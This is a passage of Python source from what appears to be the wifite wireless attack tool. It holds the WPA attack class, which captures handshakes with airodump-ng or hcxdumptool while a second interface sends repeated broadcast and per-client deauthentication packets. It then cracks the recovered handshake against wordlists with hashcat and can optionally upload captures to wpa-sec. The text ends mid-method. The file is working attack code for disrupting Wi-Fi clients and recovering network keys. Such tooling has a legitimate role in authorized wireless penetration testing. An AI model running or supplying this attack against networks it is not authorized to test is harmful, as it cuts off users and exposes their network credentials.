#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..tools.hashcat import Hashcat, HashcatCracker, HcxPcapngTool
from ..tools.airodump import Airodump
from ..tools.aireplay import Aireplay
from ..config import Configuration
from ..util.color import Color
from ..util.timer import Timer
from ..util.output import OutputManager
from ..util.logger import log_debug, log_info, log_warning, log_error
from ..model.handshake import Handshake
from ..model.wpa_result import CrackResultWPA
from ..util.wpasec_uploader import WpaSecUploader
import time
import os
import re
import subprocess
from shutil import copy
from contextlib import contextmanager


class AttackWPA(Attack):

    # Maximum retry attempts for recoverable errors
    MAX_RETRY_ATTEMPTS = 3
    RETRY_DELAY_SECONDS = 2

    def __init__(self, target):
        super(AttackWPA, self).__init__(target)
        self.clients = []
        self.crack_result = None
        self.success = False

        # Interface assignment for dual interface support
        self.interface_assignment = None
        self.capture_interface = None  # Dedicated interface for handshake capture
        self.deauth_interface = None   # Dedicated interface for deauthentication

        # Error recovery tracking
        self._retry_count = 0
        self._last_error = None
        self._recovered_from_error = False

        # Initialize TUI view if in TUI mode
        self.view = None
        if OutputManager.is_tui_mode():
            try:
                from ..ui.attack_view import WPAAttackView
                self.view = WPAAttackView(OutputManager.get_controller(), target)
            except Exception:
                # If TUI initialization fails, continue without it
                self.view = None

    @contextmanager
    def _error_recovery_context(self, operation_name: str):
        """
        Context manager for automatic error recovery during WPA attacks.

        Handles common recoverable errors:
        - Interface going down
        - Channel switching failures
        - Resource exhaustion
        - Process crashes

        Args:
            operation_name: Name of operation for logging
            
        Yields:
            None - use 'with' statement to wrap operations
        """
        from ..util.process import ProcessManager, Process
        from ..util.memory import MemoryMonitor
        
        try:
            yield
        except OSError as e:
            self._last_error = e
            log_error('AttackWPA', f'{operation_name} OS error: {e}', e)
            
            # Check for specific recoverable errors
            if e.errno == 24:  # Too many open files
                log_warning('AttackWPA', 'Too many open files, triggering cleanup')
                ProcessManager().cleanup_all()
                Process.cleanup_zombies()
                MemoryMonitor.force_cleanup()
                self._recovered_from_error = True
                raise  # Let caller retry
            elif e.errno in (19, 100):  # No such device, Network down
                log_warning('AttackWPA', 'Interface error, attempting recovery')
                self._attempt_interface_recovery()
                raise
            else:
                raise
                
        except subprocess.CalledProcessError as e:
            self._last_error = e
            log_error('AttackWPA', f'{operation_name} subprocess error: {e}', e)
            # Clean up and let caller decide whether to retry
            ProcessManager().cleanup_all()
            raise
            
        except MemoryError as e:
            self._last_error = e
            log_error('AttackWPA', f'{operation_name} memory error: {e}', e)
            # Aggressive cleanup
            MemoryMonitor.force_cleanup()
            import gc
            gc.collect()
            self._recovered_from_error = True
            raise
    
    def _attempt_interface_recovery(self):
        """
        Attempt to recover a failed interface.
        
        Tries to bring the interface back to a working state.
        """
        from ..tools.airmon import Airmon
        from ..util.logger import log_info
        
        log_info('AttackWPA', 'Attempting interface recovery')
        Color.pl('{!} {O}Attempting interface recovery...{W}')
        
        if self.view:
            self.view.add_log('Attempting interface recovery...')
        
        try:
            # Get current interface
            iface = Configuration.interface
            
            # Try to restart monitor mode
            log_info('AttackWPA', f'Restarting monitor mode on {iface}')
            
            # Stop and restart
            try:
                Airmon.stop(iface)
                time.sleep(1)
            except Exception:
                pass
            
            # Get base interface name (remove 'mon' suffix if present)
            base_iface = iface.replace('mon', '') if iface.endswith('mon') else iface
            
            # Start fresh monitor mode
            new_iface = Airmon.start(base_iface)
            if new_iface:
                Configuration.interface = new_iface
                log_info('AttackWPA', f'Interface recovered: {new_iface}')
                Color.pl('{+} {G}Interface recovered: %s{W}' % new_iface)
                if self.view:
                    self.view.add_log(f'Interface recovered: {new_iface}')
                self._recovered_from_error = True
                return True
            else:
                log_error('AttackWPA', 'Failed to recover interface')
                Color.pl('{!} {R}Failed to recover interface{W}')
                return False
                
        except Exception as e:
            log_error('AttackWPA', f'Interface recovery failed: {e}', e)
            Color.pl('{!} {R}Interface recovery failed: %s{W}' % str(e))
            return False
    
    def _run_with_retry(self, operation, operation_name: str, max_retries: int = None):
        """
        Run an operation with automatic retry on recoverable errors.
        
        Args:
            operation: Callable to execute
            operation_name: Name for logging
            max_retries: Maximum retry attempts (default: MAX_RETRY_ATTEMPTS)
            
        Returns:
            Result of operation, or None if all retries failed
        """
        from ..util.logger import log_info
        
        if max_retries is None:
            max_retries = self.MAX_RETRY_ATTEMPTS
        
        self._retry_count = 0
        last_exception = None
        
        while self._retry_count < max_retries:
            try:
                with self._error_recovery_context(operation_name):
                    result = operation()
                    
                    # Log if we recovered from an error
                    if self._recovered_from_error and self._retry_count > 0:
                        log_info('AttackWPA', f'{operation_name} succeeded after {self._retry_count} retry(s)')
                        if self.view:
                            self.view.add_log('Operation succeeded after recovery')
                    
                    return result
                    
            except (OSError, subprocess.CalledProcessError, MemoryError) as e:
                last_exception = e
                self._retry_count += 1
                
                if self._retry_count < max_retries:
                    log_warning('AttackWPA', f'{operation_name} failed (attempt {self._retry_count}/{max_retries}): {e}')
                    Color.pl('{!} {O}%s failed, retrying (%d/%d)...{W}' % (
                        operation_name, self._retry_count, max_retries))
                    
                    if self.view:
                        self.view.add_log(f'Retrying after error ({self._retry_count}/{max_retries})')
                    
                    # Delay before retry
                    time.sleep(self.RETRY_DELAY_SECONDS * self._retry_count)  # Exponential backoff
                else:
                    log_error('AttackWPA', f'{operation_name} failed after {max_retries} attempts: {e}', e)
                    Color.pl('{!} {R}%s failed after %d attempts{W}' % (operation_name, max_retries))
        
        return None

    def _get_interface_assignment(self):
        """
        Get interface assignment for WPA attack.
        
        Retrieves interface assignment from wifite instance or configuration,
        validates it for WPA attack requirements, and returns the assignment.
        
        Returns:
            InterfaceAssignment object or None if not available/invalid
        """
        from ..util.interface_assignment import InterfaceAssignmentStrategy
        from ..util.interface_manager import InterfaceManager
        from ..model.interface_info import InterfaceAssignment
        
        try:
            # Check if manual interfaces are specified in configuration
            if Configuration.interface_primary and Configuration.interface_secondary:
                Color.pl('{+} {C}Using manually specified interfaces{W}')
                
                # Get interface info for validation
                available_interfaces = InterfaceManager.get_available_interfaces()
                primary_info = next((iface for iface in available_interfaces 
                                   if iface.name == Configuration.interface_primary), None)
                secondary_info = next((iface for iface in available_interfaces 
                                     if iface.name == Configuration.interface_secondary), None)
                
                if not primary_info:
                    Color.pl('{!} {R}Primary interface %s not found{W}' % Configuration.interface_primary)
                    return None
                
                if not secondary_info:
                    Color.pl('{!} {R}Secondary interface %s not found{W}' % Configuration.interface_secondary)
                    return None
                
                # Validate the manual assignment
                is_valid, error_msg = InterfaceAssignmentStrategy.validate_dual_interface_setup(
                    primary_info, secondary_info
                )
                
                if not is_valid:
                    Color.pl('{!} {R}Manual interface assignment invalid: %s{W}' % error_msg)
                    return None
                
                # Create assignment from manual configuration
                assignment = InterfaceAssignment(
                    attack_type='wpa',
                    primary=Configuration.interface_primary,
                    secondary=Configuration.interface_secondary,
                    primary_role='Handshake capture (airodump-ng)',
                    secondary_role='Deauthentication (aireplay-ng)'
                )
                
                Color.pl('{+} {G}Manual assignment validated: %s{W}' % assignment.get_assignment_summary())
                return assignment
            
            # Check if assignment is already available (from wifite instance)
            if self.interface_assignment:
                return self.interface_assignment
            
            # Try automatic assignment if dual interface mode is enabled
            if Configuration.dual_interface_enabled:
                Color.pl('{+} {C}Attempting automatic interface assignment for WPA attack{W}')
                
                available_interfaces = InterfaceManager.get_available_interfaces()
                assignment = InterfaceAssignmentStrategy.assign_for_wpa(available_interfaces)
                
                if assignment and assignment.is_dual_interface():
                    Color.pl('{+} {G}Dual interface assignment: %s{W}' % assignment.get_assignment_summary())
                    return assignment
                elif assignment:
                    Color.pl('{+} {O}Single interface mode: %s{W}' % assignment.get_assignment_summary())
                    return assignment
                else:
                    Color.pl('{!} {O}Could not assign interfaces, using default single interface{W}')
            
            return None
            
        except Exception as e:
            Color.pl('{!} {R}Error getting interface assignment: %s{W}' % str(e))
            return None

    def run(self):
        """Initiates full WPA handshake capture attack."""

        log_info('AttackWPA', 'Starting WPA attack on %s (%s) ch %s pwr %s' % (
            self.target.essid or '?', self.target.bssid,
            self.target.channel, self.target.power))
        self._attack_start_time = time.time()

        # Start TUI view if available
        if self.view:
            self.view.start()
            # Attack type will be updated with mode info after interface assignment
            self.view.set_attack_type("WPA Handshake Capture")

        # Skip if target is not WPS
        if Configuration.wps_only and self.target.wps is False:
            Color.pl('\r{!} {O}Skipping WPA-Handshake attack on {R}%s{O} because {R}--wps-only{O} is set{W}'
                     % self.target.essid)
            self.success = False
            return self.success

        # Skip if user only wants to run PMKID attack
        if Configuration.use_pmkid_only:
            self.success = False
            return False

        # Get interface assignment for dual interface support
        self.interface_assignment = self._get_interface_assignment()
        
        # Capture the handshake (or use an old one)
        # Use dual interface mode if available, otherwise use single interface
        if self.interface_assignment and self.interface_assignment.is_dual_interface():
            Color.pl('{+} {G}Using dual interface mode for WPA attack{W}')
            handshake = self._run_dual_interface()
        else:
            # Single interface mode (existing implementation)
            if self.interface_assignment:
                Color.pl('{+} {O}Using single interface mode{W}')
            handshake = self.capture_handshake()

        if handshake is None:
            # Failed to capture handshake
            self.success = False
            return self.success

        # Analyze handshake
        Color.pl('\n{+} analysis of captured handshake file:')
        handshake.analyze()

        # Determine if the target is WPA3-SAE for upload
        target_is_wpa3_sae = (self.target.primary_authentication == 'SAE' and 
                              handshake.capfile.endswith('.pcapng'))
        
        # Upload to wpa-sec if configured
        if WpaSecUploader.should_upload():
            capture_type = 'sae' if target_is_wpa3_sae else 'handshake'
            if self.view:
                self.view.add_log("Checking wpa-sec upload configuration...")
            WpaSecUploader.upload_capture(
                handshake.capfile,
                self.target.bssid,
                self.target.essid,
                capture_type=capture_type,
                view=self.view
            )

        # Check for the --skip-crack flag
        if Configuration.skip_crack:
            return self._handle_attack_failure(
                '{+} Not cracking handshake because {C}skip-crack{W} was used{W}'
            )
        # Check wordlist
        if Configuration.wordlist is None:
            return self._handle_attack_failure(
                '{!} {O}Not cracking handshake because wordlist ({R}--dict{O}) is not set'
            )

        # Get list of wordlists to try
        wordlists_to_try = [wl for wl in Configuration.wordlists if os.path.exists(wl)]
        if not wordlists_to_try:
            Color.pl('{!} {O}Not cracking handshake because no valid wordlist files were found')
            self.success = False
            return False

        # Note: target_is_wpa3_sae already determined above for upload
        # For transition mode networks, check if we actually captured a SAE handshake
        # or a WPA2 handshake. Old .cap files from airodump-ng contain WPA2 handshakes.
        # Only .pcapng files from hcxdumptool contain SAE handshakes.

        cracker = "Hashcat" # Default to Hashcat
        # TODO: Potentially add a fallback or user choice for aircrack-ng for non-SAE?
        # For now, transitioning WPA/WPA2 cracking to Hashcat as well for consistency,
        # as Hashcat mode 22000 (hccapx) is generally preferred over aircrack-ng.
        # Aircrack.crack_handshake might be removed or kept for WEP only in future.

        key = None
        for idx, wordlist in enumerate(wordlists_to_try):
            wordlist_name = os.path.split(wordlist)[-1]
            crack_msg = f'Cracking {"WPA3-SAE" if target_is_wpa3_sae else "WPA/WPA2"} Handshake: Running {cracker} with {wordlist_name} wordlist ({idx + 1}/{len(wordlists_to_try)})'

            Color.pl(f'\n{{+}} {{C}}{crack_msg}{{W}}')

            # Update TUI view if available
            if self.view:
                self.view.add_log(crack_msg)
                self.view.update_progress({
                    'status': f'Cracking with {cracker}...',
                    'metrics': {
                        'Cracker': cracker,
                        'Wordlist': wordlist_name,
                        'Type': 'WPA3-SAE' if target_is_wpa3_sae else 'WPA/WPA2'
                    }
                })

            try:
                # Use the new HashcatCracker for non-blocking execution and progress polling
                # First, generate the hash file (we use the existing HcxPcapngTool logic via a helper)
                hash_file = HcxPcapngTool.generate_hash_file(handshake, target_is_wpa3_sae, show_command=Configuration.verbose > 1)

                if hash_file is None:
                    # Fallback to aircrack-ng if hash file generation failed
                    key = Hashcat.crack_handshake(handshake, target_is_wpa3_sae, show_command=Configuration.verbose > 1, wordlist=wordlist)
                else:
                    try:
                        with HashcatCracker(hash_file, wordlist, target_is_wpa3_sae=target_is_wpa3_sae) as cracker:
                            cracker.start(show_command=Configuration.verbose > 1)

                            while not cracker.is_finished():
                                status = cracker.poll_status()
                                if self.view:
                                    self.view.update_progress({
                                        'progress': status['progress'],
                                        'metrics': {
                                            'Speed': status['speed'],
                                            'ETA': status['eta']
                                        }
                                    })
                                time.sleep(2)

                            key = cracker.get_result()
                    finally:
                        if hash_file and os.path.exists(hash_file):
                            try:
                                os.remove(hash_file)
                            except OSError:
                                pass
            except ValueError as e: # Catch errors from hash file generation (e.g. bad capture)
                error_msg = f"Error during hash file generation for cracking: {e}"
                Color.pl(f"[!] {error_msg}")
                if self.view:
                    self.view.add_log(error_msg)
                key = None

            if key is not None:
                break

            Color.pl(f'{{!}} {{O}}{wordlist_name} did not contain password{{W}}')

        if key is None:
            fail_msg = 'Failed to crack handshake: password not found in any wordlist'
            Color.pl(f"{{!}} {{R}}{fail_msg}{{W}}")
            if self.view:
                self.view.add_log(fail_msg)
                self.view.update_progress({
                    'status': 'Cracking failed',
                    'progress': 0.0
                })
            self.success = False
        else:
            success_msg = f"Cracked {'WPA3-SAE' if target_is_wpa3_sae else 'WPA/WPA2'} Handshake Key: {key}"
            Color.pl(f"[+] {success_msg}\n")
            if self.view:
                self.view.add_log(success_msg)
                self.view.update_progress({
                    'status': 'Successfully cracked!',
                    'progress': 1.0,
                    'metrics': {
                        'Key': key,
                        'Status': 'Success'
                    }
                })
            self.crack_result = CrackResultWPA(handshake.bssid, handshake.essid, handshake.capfile, key)
            self.crack_result.dump()
            self.success = True

        elapsed = time.time() - getattr(self, '_attack_start_time', time.time())
        log_info('AttackWPA', 'WPA attack on %s finished in %.1fs — %s' % (
            self.target.bssid, elapsed, 'SUCCESS' if self.success else 'no key'))
        return self.success

    def _handle_attack_failure(self, message):
        Color.pl(message)
        self.success = False
        return False

    def _run_dual_interface(self):
        """
        Run WPA attack with two interfaces (continuous capture, parallel deauth).
        
        This method implements the dual interface attack flow:
        1. Configure both interfaces in monitor mode
        2. Start continuous capture on primary interface
        3. Send deauth from secondary interface (non-blocking)
        4. Wait for handshake without interrupting capture
        
        Returns:
            Handshake object if captured, None otherwise
        """
        from ..tools.airmon import Airmon
        from ..tools.hcxdumptool import HcxDumpTool
        
        # Check if hcxdump mode is requested
        use_hcxdump_mode = False
        if Configuration.use_hcxdump:
            from ..util.logger import log_info, log_warning, log_debug
            log_debug('AttackWPA', 'Checking hcxdumptool availability for --hcxdump mode')
            
            # Check if hcxdumptool is available
            if not HcxDumpTool.exists():
                log_warning('AttackWPA', 'hcxdumptool not found, falling back to airodump-ng')
                Color.pl('{!} {O}hcxdumptool not found{W}')
                Color.pl('{!} {O}Install from: {C}%s{W}' % HcxDumpTool.dependency_url)
                Color.pl('{!} {O}Falling back to airodump-ng mode{W}')
            else:
                # Check minimum version requirement (6.2.0+)
                if not HcxDumpTool.check_minimum_version('6.2.0'):
                    current_version = HcxDumpTool.check_version()
                    log_warning('AttackWPA', f'hcxdumptool version {current_version} is insufficient (need 6.2.0+), falling back to airodump-ng')
                    Color.pl('{!} {O}hcxdumptool version {R}%s{O} is insufficient{W}' % (current_version or 'unknown'))
                    Color.pl('{!} {O}Minimum required version: {G}6.2.0{W}')
                    Color.pl('{!} {O}Falling back to airodump-ng mode{W}')
                else:
                    # All checks passed, use hcxdump mode
                    use_hcxdump_mode = True
                    log_info('AttackWPA', 'hcxdumptool mode activated for dual interface capture')
                    Color.pl('{+} {G}Using hcxdumptool for dual interface capture{W}')
                    if self.view:
                        self.view.add_log('Using hcxdumptool mode for capture')
        
        try:
            from ..util.logger import log_info, log_debug, log_error
            
            # Extract interfaces from assignment
            self.capture_interface = self.interface_assignment.primary
            self.deauth_interface = self.interface_assignment.secondary
            
            log_info('AttackWPA', f'Starting dual interface WPA attack: capture={self.capture_interface}, deauth={self.deauth_interface}')
            
            Color.pl('\n{+} {C}Running WPA attack in dual interface mode [DUAL]{W}')
            Color.pl('{+} {C}Capture interface: {G}%s{W}' % self.capture_interface)
            Color.pl('{+} {C}Deauth interface: {G}%s{W}' % self.deauth_interface)
            
            if self.view:
                # Update attack type to show dual interface mode
                mode_tag = "[DUAL-HCX]" if use_hcxdump_mode else "[DUAL]"
                self.view.set_attack_type(f"WPA Handshake Capture {mode_tag}")
                self.view.add_log(f"Dual interface mode: Capture={self.capture_interface}, Deauth={self.deauth_interface}")
            
            # Put both interfaces in monitor mode (validation already done at startup)
            log_debug('AttackWPA', f'Enabling monitor mode on capture interface {self.capture_interface}')
            Color.pl('{+} {C}Enabling monitor mode on capture interface {G}%s{W}...' % self.capture_interface)
            capture_monitor = Airmon.start(self.capture_interface)
            if not capture_monitor:
                log_error('AttackWPA', f'Failed to enable monitor mode on capture interface {self.capture_interface}')
                Color.pl('{!} {R}Failed to enable monitor mode on capture interface{W}')
                return None
            
            log_debug('AttackWPA', f'Enabling monitor mode on deauth interface {self.deauth_interface}')
            Color.pl('{+} {C}Enabling monitor mode on deauth interface {G}%s{W}...' % self.deauth_interface)
            deauth_monitor = Airmon.start(self.deauth_interface)
            if not deauth_monitor:
                log_error('AttackWPA', f'Failed to enable monitor mode on deauth interface {self.deauth_interface}')
                Color.pl('{!} {R}Failed to enable monitor mode on deauth interface{W}')
                # Try to stop the capture monitor interface
                Airmon.stop(capture_monitor)
                return None
            
            # Update interface names to monitor mode names
            self.capture_interface = capture_monitor
            self.deauth_interface = deauth_monitor
            
            log_info('AttackWPA', f'Monitor mode enabled on both interfaces: {self.capture_interface}, {self.deauth_interface}')
            Color.pl('{+} {G}Monitor mode enabled on both interfaces [DUAL]{W}')
            Color.pl('{+} {C}Capture: {G}%s{W}, Deauth: {G}%s{W}' % (self.capture_interface, self.deauth_interface))
            
            if self.view:
                self.view.add_log(f"Monitor mode enabled: {self.capture_interface}, {self.deauth_interface}")
            
            # Set both interfaces to target channel with error handling
            self._set_interface_channels()
            
            # Verify both interfaces are on the target channel
            self._verify_channel_sync()
            
            # Route to appropriate capture method based on configuration
            if use_hcxdump_mode:
                log_info('AttackWPA', 'Routing to hcxdumptool capture method [DUAL-HCX]')
                Color.pl('{+} {C}Using hcxdumptool capture method [DUAL-HCX]{W}')
                if self.view:
                    self.view.add_log('Capture method: hcxdumptool [DUAL-HCX]')
                handshake = self._capture_handshake_dual_hcxdump()
            else:
                log_info('AttackWPA', 'Routing to airodump-ng capture method [DUAL]')
                Color.pl('{+} {C}Using airodump-ng capture method [DUAL]{W}')
                if self.view:
                    self.view.add_log('Capture method: airodump-ng [DUAL]')
                handshake = self._capture_handshake_dual_airodump()
            
            # Stop monitor mode on both interfaces
            Color.pl('\n{+} {C}Stopping monitor mode...{W}')
            Airmon.stop(self.capture_interface)
            Airmon.stop(self.deauth_interface)
            
            return handshake
            
        except Exception as e:
            Color.pl('{!} {R}Error in dual interface WPA attack: %s{W}' % str(e))
            if self.view:
                self.view.add_log(f"Error: {str(e)}")
            
            # Try to cleanup interfaces
            import contextlib
            with contextlib.suppress(Exception):
                if self.capture_interface:
                    Airmon.stop(self.capture_interface)
                if self.deauth_interface:
                    Airmon.stop(self.deauth_interface)
            
            return None

    def _capture_handshake_dual_airodump(self):
        """
        Capture handshake using dual interface mode with airodump-ng.
        
        Uses dedicated capture interface for continuous packet capture
        and dedicated deauth interface for sending deauth packets without
        interrupting the capture.
        
        Returns:
            Handshake object if captured, None otherwise
        """
        handshake = None
        
        # Start Airodump on capture interface
        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      skip_wps=True,
                      output_file_prefix='wpa',
                      interface=self.capture_interface) as airodump:
            
            Color.clear_entire_line()
            Color.pattack('WPA', self.target, 'Handshake capture', 'Waiting for target to appear...')
            
            try:
                airodump_target = self.wait_for_target(airodump)
            except Exception as e:
                Color.pl('\n{!} {R}Target timeout:{W} %s' % str(e))
                return None
            
            self.clients = []
            
            # Try to load existing handshake
            if not Configuration.ignore_old_handshakes:
                bssid = airodump_target.bssid
                essid = airodump_target.essid if airodump_target.essid_known else None
                handshake = self.load_handshake(bssid=bssid, essid=essid)
                if handshake:
                    Color.pattack('WPA', self.target, 'Handshake capture',
                                  'found {G}existing handshake{W} for {C}%s{W}' % handshake.essid)
                    Color.pl('\n{+} Using handshake from {C}%s{W}' % handshake.capfile)
                    return handshake
            
            timeout_timer = Timer(Configuration.wpa_attack_timeout)
            deauth_timer = Timer(Configuration.wpa_deauth_timeout)
            
            while handshake is None and not timeout_timer.ended():
                step_timer = Timer(1)
                
                # Update TUI view if available
                if self.view:
                    self.view.refresh_if_needed()
                    self.view.update_progress({
                        'status': f'Listening for handshake (clients: {len(self.clients)}) [DUAL]',
                        'metrics': {
                            'Mode': 'DUAL (airodump-ng)',
                            'Capture': self.capture_interface,
                            'Deauth': self.deauth_interface,
                            'Clients': len(self.clients),
                            'Deauth Timer': str(deauth_timer),
                            'Timeout': str(timeout_timer)
                        }
                    })
                
                Color.clear_entire_line()
                Color.pattack('WPA',
                              airodump_target,
                              'Handshake capture',
                              'Listening [DUAL]. (clients:{G}%d{W}, deauth:{O}%s{W}, timeout:{R}%s{W})' % (
                                  len(self.clients), deauth_timer, timeout_timer))
                
                # Find .cap file
                cap_files = airodump.find_files(endswith='.cap')
                if len(cap_files) == 0:
                    # No cap files yet
                    time.sleep(step_timer.remaining())
                    continue
                cap_file = cap_files[0]
                
                # Copy .cap file to temp for consistency
                temp_file = Configuration.temp('handshake.cap.bak')
                
                # Check file size before copying
                try:
                    file_size = os.path.getsize(cap_file)
                    max_cap_size = 50 * 1024 * 1024  # 50MB limit
                    if file_size > max_cap_size:
                        Color.pl('\n{!} {O}Warning: Capture file is large (%d MB), may cause memory issues{W}' % (file_size // (1024*1024)))
                except (OSError, IOError):
                    pass
                
                copy(cap_file, temp_file)
                
                # Check cap file for handshake
                from ..util.logger import log_debug, log_info
                bssid = airodump_target.bssid
                essid = airodump_target.essid if airodump_target.essid_known else None
                log_debug('AttackWPA', f'Checking for handshake in capture file (BSSID: {bssid})')
                
                handshake = Handshake(temp_file, bssid=bssid, essid=essid)
                if handshake.has_handshake():
                    # We got a handshake
                    log_info('AttackWPA', f'Handshake captured successfully for {bssid} [DUAL]')
                    
                    Color.clear_entire_line()
                    Color.pattack('WPA',
                                  airodump_target,
                                  'Handshake capture',
                                  '{G}Captured handshake{W} [DUAL]')
                    Color.pl('')
                    
                    # Update TUI view
                    if self.view:
                        self.view.add_log('Captured handshake!')
                        self.view.update_progress({
                            'status': 'Handshake captured successfully',
                            'progress': 1.0,
                            'metrics': {
                                'Handshake': '✓',
                                'Mode': 'DUAL (airodump-ng)',
                                'Capture': self.capture_interface,
                                'Deauth': self.deauth_interface,
                                'Clients': len(self.clients)
                            }
                        })
                    
                    # Upload to wpa-sec if configured
                    if WpaSecUploader.should_upload():
                        # Determine capture type based on file extension
                        capture_type = 'sae' if handshake.capfile.endswith('.pcapng') else 'handshake'
                        if self.view:
                            self.view.add_log("Checking wpa-sec upload configuration...")
                        WpaSecUploader.upload_capture(
                            handshake.capfile,
                            self.target.bssid,
                            self.target.essid,
                            capture_type=capture_type,
                            view=self.view
                        )
                    
                    break
                
                # No handshake yet
                handshake = None
                os.remove(temp_file)
                
                # Look for new clients
                try:
                    airodump_target = self.wait_for_target(airodump)
                except Exception as e:
                    Color.pl('\n{!} {R}Target timeout:{W} %s' % str(e))
                    break
                
                for client in airodump_target.clients:
                    if client.station not in self.clients:
                        Color.clear_entire_line()
                        Color.pattack('WPA',
                                      airodump_target,
                                      'Handshake capture',
                                      'Discovered new client: {G}%s{W}' % client.station)
                        Color.pl('')
                        self.clients.append(client.station)
                        
                        if self.view:
                            self.view.add_log(f'Discovered new client: {client.station}')
                
                # Send deauth from secondary interface (non-blocking)
                if deauth_timer.ended():
                    self._deauth_dual(airodump_target)
                    deauth_timer = Timer(Configuration.wpa_deauth_timeout)
                
                time.sleep(step_timer.remaining())
        
        if handshake is None:
            Color.pl('\n{!} {O}WPA handshake capture {R}FAILED:{O} Timed out after %d seconds' % (
                Configuration.wpa_attack_timeout))
        else:
            # Save copy of handshake
            self.save_handshake(handshake)
        
        return handshake

    def _set_interface_channels(self):
        """
        Set both interfaces to the target channel with error handling.
        
        Attempts to set both capture and deauth interfaces to the target channel.
        If one interface fails, logs an error but continues with the working interface.
        """
        from ..util.process import Process
        from ..util.logger import log_info
        
        target_channel = self.target.channel
        capture_success = False
        deauth_success = False
        
        # Set capture interface channel
        try:
            log_debug('AttackWPA', f'Setting {self.capture_interface} to channel {target_channel}')
            Process(['iw', self.capture_interface, 'set', 'channel', str(target_channel)]).wait()
            capture_success = True
            log_info('AttackWPA', f'Successfully set {self.capture_interface} to channel {target_channel}')
        except Exception as e:
            error_msg = f'Failed to set channel on {self.capture_interface}: {e}'
            log_error('AttackWPA', error_msg, e)
            Color.pl('{!} {R}Error: %s{W}' % error_msg)
            if self.view:
                self.view.add_log(f'Error: {error_msg}')
        
        # Set deauth interface channel
        try:
            log_debug('AttackWPA', f'Setting {self.deauth_interface} to channel {target_channel}')
            Process(['iw', self.deauth_interface, 'set', 'channel', str(target_channel)]).wait()
            deauth_success = True
            log_info('AttackWPA', f'Successfully set {self.deauth_interface} to channel {target_channel}')
        except Exception as e:
            error_msg = f'Failed to set channel on {self.deauth_interface}: {e}'
            log_error('AttackWPA', error_msg, e)
            Color.pl('{!} {R}Error: %s{W}' % error_msg)
            if self.view:
                self.view.add_log(f'Error: {error_msg}')
        
        # Report overall status
        if capture_success and deauth_success:
            Color.pl('{+} {G}Both interfaces set to channel %d [DUAL]{W}' % target_channel)
            Color.pl('{+} {C}  Capture: {G}%s{W}, Deauth: {G}%s{W}' % (self.capture_interface, self.deauth_interface))
            if self.view:
                self.view.add_log(f'Both interfaces set to channel {target_channel} [DUAL]')
        elif capture_success or deauth_success:
            working_iface = self.capture_interface if capture_success else self.deauth_interface
            Color.pl('{!} {O}Warning: Only %s successfully set to channel %d{W}' % (working_iface, target_channel))
            Color.pl('{!} {O}Continuing with working interface...{W}')
            if self.view:
                self.view.add_log(f'Warning: Only {working_iface} on channel {target_channel}')
        else:
            Color.pl('{!} {R}Error: Failed to set channel on both interfaces{W}')
            if self.view:
                self.view.add_log('Error: Failed to set channel on both interfaces')

    def _verify_channel_sync(self):
        """
        Verify both interfaces are on the target channel.
        
        Checks the current channel of both capture and deauth interfaces
        and logs a warning if they don't match the target channel.
        """
        from ..util.interface_manager import InterfaceManager
        
        try:
            # Get current channel of both interfaces
            capture_channel = InterfaceManager._get_interface_channel(self.capture_interface)
            deauth_channel = InterfaceManager._get_interface_channel(self.deauth_interface)
            target_channel = self.target.channel
            
            log_debug('AttackWPA', f'Channel verification: target={target_channel}, capture={capture_channel}, deauth={deauth_channel}')
            
            # Check if capture interface is on target channel
            if capture_channel != target_channel:
                warning_msg = f'Capture interface {self.capture_interface} is on channel {capture_channel}, expected {target_channel}'
                log_warning('AttackWPA', warning_msg)
                Color.pl('{!} {O}Warning: %s{W}' % warning_msg)
                if self.view:
                    self.view.add_log(f'Warning: {warning_msg}')
            
            # Check if deauth interface is on target channel
            if deauth_channel != target_channel:
                warning_msg = f'Deauth interface {self.deauth_interface} is on channel {deauth_channel}, expected {target_channel}'
                log_warning('AttackWPA', warning_msg)
                Color.pl('{!} {O}Warning: %s{W}' % warning_msg)
                if self.view:
                    self.view.add_log(f'Warning: {warning_msg}')
            
            # Log success if both match
            if capture_channel == target_channel and deauth_channel == target_channel:
                Color.pl('{+} {G}Both interfaces verified on channel %d [DUAL]{W}' % target_channel)
                Color.pl('{+} {C}  %s: ch %d, %s: ch %d{W}' % (
                    self.capture_interface, capture_channel,
                    self.deauth_interface, deauth_channel))
                if self.view:
                    self.view.add_log(f'Channel sync verified: both on channel {target_channel} [DUAL]')
        
        except Exception as e:
            log_warning('AttackWPA', f'Failed to verify channel synchronization: {e}')
            Color.pl('{!} {O}Warning: Could not verify channel synchronization{W}')

    def _deauth_dual(self, target):
        """
        Send deauthentication packets using dedicated deauth interface.
        
        This method sends deauth packets from the secondary interface without
        interrupting the capture on the primary interface.
        
        Args:
            target: The Target to deauth, including clients
        """
        if Configuration.no_deauth:
            return
        
        for client in [None] + self.clients:
            target_name = '*broadcast*' if client is None else client
            Color.clear_entire_line()
            Color.pattack('WPA',
                          target,
                          'Handshake capture',
                          'Deauthing {O}%s{W} [DUAL] from {C}%s{W}' % (target_name, self.deauth_interface))
            
            if self.view:
                self.view.add_log(f'Deauth [DUAL] to {target_name} from {self.deauth_interface}')
            
            # Send deauth from dedicated deauth interface
            Aireplay.deauth(target.bssid, 
                          client_mac=client, 
                          timeout=2,
                          interface=self.deauth_interface)

    def _deauth_parallel(self, target):
        """
        Send deauthentication packets from both interfaces in parallel.
        
        This method sends deauth packets from both the primary and secondary
        interfaces simultaneously using threads for better coverage.
        
        Args:
            target: The Target to deauth, including clients
        """
        if Configuration.no_deauth:
            return
        
        import threading
        
        # Get client list (broadcast if empty)
        clients = [None] + self.clients if self.clients else [None]
        
        def deauth_from_interface(interface, bssid, clients):
            """Thread function to send deauth from a single interface."""
            try:
                for client in clients:
                    if Configuration.verbose > 1:
                        from ..util.logger import log_debug
                        client_name = '*broadcast*' if client is None else client
                        log_debug('AttackWPA', f'Sending deauth to {client_name} from {interface}')
                    Aireplay.deauth(bssid, 
                                  client_mac=client, 
                                  timeout=2,
                                  interface=interface)
            except Exception as e:
                from ..util.logger import log_debug
                log_debug('AttackWPA', f'Deauth error on {interface}: {e}')
        
        # Display status
        Color.clear_entire_line()
        Color.pattack('WPA',
                      target,
                      'Handshake capture',
                      'Deauthing from {C}%s{W} and {C}%s{W} [DUAL-HCX]' % (
                          self.capture_interface, self.deauth_interface))
        
        if self.view:
            self.view.add_log(f'Parallel deauth from {self.capture_interface} and {self.deauth_interface}')
        
        # Start threads for both interfaces
